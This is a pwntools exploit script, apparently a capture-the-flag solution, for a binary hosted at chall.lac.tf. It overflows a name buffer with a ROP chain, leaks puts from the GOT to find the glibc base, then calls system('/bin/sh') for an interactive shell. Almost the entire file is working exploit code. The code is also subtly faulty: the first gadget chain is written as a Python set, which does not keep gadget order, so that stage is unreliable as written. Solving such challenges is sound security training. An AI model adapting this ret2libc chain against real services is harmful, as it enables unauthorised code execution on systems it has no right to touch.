from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chall', '''
#     b *0x401266
#     b *0x401387
#     continue
# ''')

p = remote('chall.lac.tf', 31137)

e = ELF('./chall')
r = ROP('./chall')
glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')

chain1 = {
    (0x404040&-0xfff)+0x800,   # bss as fake rbp
    0x4011bb,   # ret; for assign padding
    0x401176,   # read_int, read in e.got.puts and keep it in rax
    0x401367    # mov rdi, rax; call puts; for glibc puts leaking
}

p.recvuntil(b"2. Multiplayer\n")
p.sendline(b'1')
p.recvuntil(b"Enter world name:\n")
p.sendline(b'A'*0x40+b"".join([p64(addr) for addr in chain1]))
p.recvuntil(b"2. Creative\n")
p.sendline(b'1')
p.recvuntil(b"2. Exit\n")
p.sendline(b'2')
p.sendline(b'4210688')  # e.got.puts: 0x404000
glibc_base_addr = u64(p.recvline().strip().ljust(8, b'\x00')) - glibc_e.symbols.puts
p.sendline(b'1')

chain2 = [
    glibc_base_addr+glibc_r.rdi.address,
    glibc_base_addr+next(glibc_e.search(b"/bin/sh")),
    glibc_base_addr+glibc_r.ret.address,
    glibc_base_addr+glibc_e.symbols.system
]

p.recvuntil(b"2. Multiplayer\n")
p.sendline(b'1')
p.recvuntil(b"Enter world name:\n")
p.sendline(b'A'*0x48+b"".join([p64(addr) for addr in chain2]))
p.recvuntil(b"2. Creative\n")
p.sendline(b'1')
p.recvuntil(b"2. Exit\n")
p.sendline(b'2')

p.interactive()
